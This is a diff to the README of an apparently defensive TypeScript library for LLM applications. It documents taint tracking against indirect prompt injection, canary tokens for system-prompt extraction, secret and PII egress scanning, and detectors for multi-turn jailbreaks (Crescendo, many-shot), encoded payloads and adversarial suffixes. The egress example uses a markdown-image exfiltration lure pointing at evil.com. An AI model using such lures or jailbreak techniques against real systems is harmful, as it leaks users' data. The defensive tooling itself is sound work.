@@ -151,7 +151,7 @@ const answer = await safeComplete(userPrompt);
 
 On `block`, throws `GuardBlockError` (or calls `onBlock`). On `flag`, calls `onFlag` and passes sanitized text through.
 
-### `guard.checkToolCall(call, policy): Promise<GuardResult>`
+### `guard.checkToolCall(call, policy, opts?): Promise<GuardResult>`
 
 Least-privilege assist for agentic tool calls — scans the call's args through the full pipeline and enforces a name allowlist **before execution**. `highRiskAction` is forced, so the uncertain band fails closed.
 
@@ -165,6 +165,19 @@ if (result.verdict === 'block') return refuse(result.reasons);
 ```
 
 A tool name outside `policy.allow` always blocks (`agentic_tool_hijack`); a name inside the allowlist still has its `args` scanned for injection. The privilege model itself (what a tool is actually allowed to do) stays in your runtime — this only gates against running an injected/disallowed call.
+
+Pass an optional `opts.tracker` (a [`TaintTracker`](#taint--opensentrytaint) from `opensentry/taint`) to also catch **indirect injection** — untrusted-origin text (retrieved/tool/web/email) reaching a privileged tool call emits `tainted_data_flow` and fails closed. This is policy, not a classifier, so it's low false-positive:
+
+```ts
+import { createTaintTracker } from 'opensentry/taint';
+const tracker = createTaintTracker();
+tracker.mark(retrievedDoc, 'retrieved'); // register untrusted-origin spans
+const result = await guard.checkToolCall(
+  { name: 'sendEmail', args: { body: maybePastedContent } },
+  { allow: { sendEmail: {} } },
+  { tracker },
+);
+```
 
 ### `GuardResult`
 
@@ -180,6 +193,8 @@ interface GuardResult {
   tier: 0 | 1 | 2;
   source: Source;
   shadow: boolean;
+  degraded?: { tier: 0|1|2; reason: ReasonCode }; // a tier failed open — surfaced, never silent
+  neutralized?: boolean;                      // an encoded payload in the model copy was stripped/spotlighted
   latencyMs: number;
 }
 ```
@@ -605,6 +620,14 @@ const guard = createGuard({
     decodeEncoded: true,     // base64/hex/URL/HTML-entity decode-rescan
     maxScanBytes: 65536,     // truncate-with-flag above this
     rtlLocales: ['ar', 'he', 'fa', 'ur', ...],
+    // ── Security hardening (all default-off, see "Security hardening") ──
+    neutralizeEncoded: 'off',        // 'off' | 'strip' | 'spotlight' — rewrite the MODEL copy
+                                     // when a decoded blob re-scans as injection (closes the
+                                     // detect→model gap; benign base64 untouched)
+    specialTokens: [...],            // tokenizer control tokens → special_token_injection
+                                     // (defaults to a Llama/Qwen/GPT/Mistral/Gemma list)
+    scanAdversarialSuffix: false,    // cheap GCG/token-salad signal → adversarial_suffix
+                                     // (opt-in; low-weight escalation signal only)
   },
 });
 ```
@@ -743,36 +766,58 @@ Guarantee: if the untrusted input already contains the chosen delimiter/marker, 
 
 ### Egress filter — `opensentry/egress`
 
-Blocks data exfiltration on the way OUT (markdown-image lures, disallowed URLs):
+Blocks data exfiltration on the way OUT — disallowed URLs (markdown-image lures, bare URLs) **and**, opt-in, leaked secrets / PII in the payload:
 
 ```ts
 import { egressFilter } from 'opensentry/egress';
 
+// URL allowlist (always on) — disallowed URLs hard-block.
 const r = egressFilter('![data](https://evil.com/exfil?d=secret)', {
   allowlist: ['https://api.example.com', /^https:\/\/cdn\.example\.com\//],
   stripDisallowed: true,
 });
 // r.verdict === 'block'
 // r.safe === '' (URL stripped)
+
+// Secret scanning (opt-in) — known key shapes (OpenAI/GitHub/AWS/JWT/Slack/Google)
+// + high-entropy token runs → secret_egress. Flag-not-block.
+const s = egressFilter('leaked: sk-proj-abc123def456ghi789jkl012mno345pqr678', {
+  allowlist: [],
+  scanSecrets: true,
+  secretAllowlist: [/^sk-proj-public-/, 'AKIAEXAMPLE'], // known-safe tokens
+});
+// s.verdict === 'flag', s.reasons has secret_egress
+
+// PII scanning (opt-in, defaults off — locale-sensitive) — email/phone/card(Luhn)/SSN
+// or BYO RegExp[] → pii_egress. Flag-not-block.
+const p = egressFilter('Reach me at alice@example.com', {
+  allowlist: [],
+  scanPii: true,        // built-in patterns, or pass RegExp[] for custom
+});
+// p.verdict === 'flag', p.reasons has pii_egress
 ```
 
 ### Prompt assembler — `opensentry/prompt`
 
-Channel separation: assemble prompts from typed fields, never string concatenation. Untrusted content is role-marker-stripped + auto-spotlighted:
+Channel separation: assemble prompts from typed fields, never string concatenation. Untrusted content is role-marker-stripped + auto-spotlighted. Optionally auto-inject a [canary](#canary--opensentrycanary) into the system prompt for deterministic leak detection:
 
 ```ts
 import { assemble } from 'opensentry/prompt';
+import { createCanary } from 'opensentry/canary';
 
-const { messages } = assemble({
+const canary = createCanary();
+const { messages, canary: injected } = assemble({
   system: 'You are a helpful assistant.',
   untrusted: [
     { source: 'retrieved', content: ragChunk },
     { source: 'web', content: webpage },
   ],
+  canary, // optional — injected into the system message, surfaced in the result
 });
-// messages[0] → { role: 'system', content: 'You are a helpful assistant.' }
+// messages[0] → { role: 'system', content: 'You are a helpful assistant.\n\n[internal-reference:<canary>]' }
 // messages[1] → { role: 'user', content: '\uE000...datamarked RAG...' }
 // messages[2] → { role: 'user', content: '\uE000...datamarked web...' }
+// Later: detectCanaryLeak(modelOutput, [canary]) → deterministic system-prompt-extraction check.
 ```
 
 ## Middleware
@@ -819,6 +864,83 @@ export async function POST(req: Request) {
 }
 ```
 
+## Security hardening
+
+The gaps a stateless single-message filter *structurally cannot see* — each shipped default-off or behind a new subpath so the zero-config Tier-0 path is unchanged. See [`SECURITY_FEATURES_PLAN.md`](SECURITY_FEATURES_PLAN.md).
+
+### Canary — `opensentry/canary`
+
+Deterministic, near-zero-FP system-prompt-leak detection. Inject an unguessable 128-bit nonce into the system prompt; if it ever appears in model output, the prompt was extracted.
+
+```ts
+import { createCanary, injectCanary, detectCanaryLeak } from 'opensentry/canary';
+
+const canary = createCanary();                 // 'opensentry-canary-<32 hex chars>'
+const prompt = injectCanary('You are...', canary); // appends [internal-reference:<canary>]
+
+// ...after the model responds...
+const leak = detectCanaryLeak(modelOutput, [canary]);
+if (leak.leaked) {
+  // confirmed extraction (canary.leak is a hard-block reason) — not a heuristic guess.
+}
+```
+
+`assemble({ canary })` (above) auto-injects. `detectCanaryLeak` is intended for the output/egress scan path; a hit maps to the `canary_leak` reason (hard-block).
+
+### Taint — `opensentry/taint`
+
+Provenance-passing for indirect-injection defense — the "XSS of the AI-agent era". JS has no true taint propagation, so this is an explicit, honest heuristic: mark spans of untrusted-origin text and later ask whether a candidate string (e.g. a tool call's args) contains any.
+
+```ts
+import { createTaintTracker } from 'opensentry/taint';
+
+const tracker = createTaintTracker();
+tracker.mark(retrievedDoc, 'retrieved');       // register untrusted-origin spans
+tracker.mark(webContent, 'web');
+
+const hit = tracker.containsTainted(maybePastedArgs);
+// hit.tainted, hit.sources, hit.marks
+
+// Wire into checkToolCall (see guard.checkToolCall above): untrusted-origin text reaching a
+// privileged tool call → tainted_data_flow + fail-closed.
+```
+
+No effect unless a tracker is wired and `checkToolCall` is gated — flags *data flow into privileged actions*, not content.
+
+### Session — `opensentry/session`
+
+Stateful multi-turn guard. Crescendo, Bad Likert Judge, and many-shot exceed ~70% success because **no single turn is flaggable**. `createSessionGuard` wraps a `Guard` with per-`conversationId` state and folds three session-level signals via noisy-OR: `cumulative_risk` (decaying sum), `session_escalation` (Crescendo score gradient), `manyshot_density` (many synthetic role-pairs in one turn). Flag-weighted, decaying; **can only escalate, never de-escalate**.
+
+```ts
+import { createGuard } from 'opensentry';
+import { createSessionGuard } from 'opensentry/session';
+
+const guard = createGuard();
+const sg = createSessionGuard(guard, { decay: 0.8, escalationDelta: 0.3 });
+
+// Per turn:
+const r = await sg.check(userTurn, { conversationId: 'conv-123', source: 'user' });
+// r.reasons may now include cumulative_risk / session_escalation / manyshot_density
+
+sg.reset('conv-123');           // clear state on conversation end
+sg.stateOf('conv-123');         // audit: { cumulativeScore, turns, refusedTopics }
+```
+
+BYO `SessionStore` for distributed deployments (Redis/DB); the default is an in-memory LRU with TTL.
+
+### Neutralize encoded payloads
+
+`normalize.neutralizeEncoded` closes the detect→model gap: today a decoded blob is *detected* but the original encoded blob still ships in `sanitized` — a downstream model decodes and obeys it. Set to `'strip'` (remove the blob from the model copy) or `'spotlight'` (datamark it as inert data). Default `'off'`. Only fires on blobs that *themselves* re-scan as injection; benign base64 (images, hashes) is untouched. Emits `encoded_payload_neutralized` and sets `GuardResult.neutralized = true`. See [Normalization](#normalization).
+
+### Special-token & adversarial-suffix detection (Tier 0)
+
+- **`normalize.specialTokens`** (default Llama/Qwen/GPT/Mistral/Gemma list) → `special_token_injection`. Control tokens have essentially zero legitimate use in untrusted user data. A `<`/`[` pre-check keeps the hot path cheap.
+- **`normalize.scanAdversarialSuffix`** (opt-in, default off) → low-weight `adversarial_suffix`. A zero-LM proxy for GCG/optimizer suffixes, calibrated to **0 benign FP** on code/base64/hashes/JSON. Escalation signal only — routes to Tier 1, never blocks on its own.
+
+### SmoothLLM consensus (Tier 1)
+
+`LocalModelDetector.smoothing: { n, perturbation }` runs `n` lightly-perturbed copies through the classifier on `highRiskAction` only and takes the mean. Adversarial suffixes are brittle to perturbation; benign text is not. Stays off the common (non-high-risk) path.
+
 ## Subpath exports
 
 | Subpath | Description |
@@ -826,8 +948,11 @@ export async function POST(req: Request) {
 | `opensentry` | Core: Tier 0 guard, normalization, heuristics |
 | `opensentry/confusables` | Extended UTS-39 confusables table |
 | `opensentry/spotlight` | Spotlighting companion (delimit/datamark/encode) |
-| `opensentry/egress` | Outbound URL allowlist / exfil filter |
-| `opensentry/prompt` | Typed channel-separation prompt assembler |
+| `opensentry/egress` | Outbound URL allowlist / exfil + secret/PII egress filter |
+| `opensentry/prompt` | Typed channel-separation prompt assembler (+ canary auto-inject) |
+| `opensentry/canary` | Canary tokens for deterministic system-prompt-leak detection |
+| `opensentry/taint` | Provenance-passing taint tracker for indirect-injection defense |
+| `opensentry/session` | Stateful multi-turn / session guard (Crescendo / many-shot) |
 | `opensentry/express` | Express / Pages Router middleware |
 | `opensentry/hono` | Hono middleware (edge-compatible) |
 | `opensentry/next` | Next.js App Router middleware |
